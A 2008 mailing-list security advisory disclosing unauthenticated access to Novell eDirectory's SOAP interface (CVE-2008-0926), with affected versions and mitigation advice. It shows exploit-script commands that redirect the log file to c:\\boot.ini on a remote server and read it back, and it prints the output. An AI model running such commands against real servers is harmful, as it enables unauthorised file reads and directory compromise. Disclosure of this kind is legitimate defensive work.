
Date: Mon, 05 May 2008 21:26:27 +0200
From: Nicob <nicob@...ob.net>
To: vulnwatch@...nwatch.org, bugtraq@...urityfocus.com,
	full-disclosure@...ts.grok.org.uk
Subject: Novell eDirectory unauthenticated access to SOAP
	interface

[=] Affected software :

	Editor : Novell
	Name : eDirectory
	Version : 8.7.x (see note) and < 8.8.2
	Services : TCP/8028 (HTTP) and TCP/8030 (HTTPS)

[=] External references :

http://www.novell.com/support/viewContent.do?externalId=3866911&sliceId=1
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0926

[=] Technical details :

A SOAP interface is available at the "/SOAP" URL. It is usually used
through the command-line client "edirutil.exe". This tool enforces
access control internally : the user is never authenticated directly on
the server, and authentication state is kept locally (i.e. client side).
It can by default be exploited to get the full DN, modify the name of
the log file, read its content, stop and start eDirectory components ...
Additional commands (depending of the server configuration) can be used
to backup the database to a file, allowing full compromise of the
directory when combined with the read_logs action.

nicob $> ./eMBox.pl 192.168.1.1 set_logfile c:\\boot.ini
Logger settings changed successfully

nicob $> ./eMBox.pl 192.168.1.1 read_logs               
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINNT
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINNT="Microsoft Windows 2000 Server" /fastdetect

[=] Note to eDirectory 8.7.x users :

This vulnerability isn't patched in 8.7.3 SP 10. You should instead
prevent the EMBOX module from loading (see Novell advisory for details).

Nicob

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
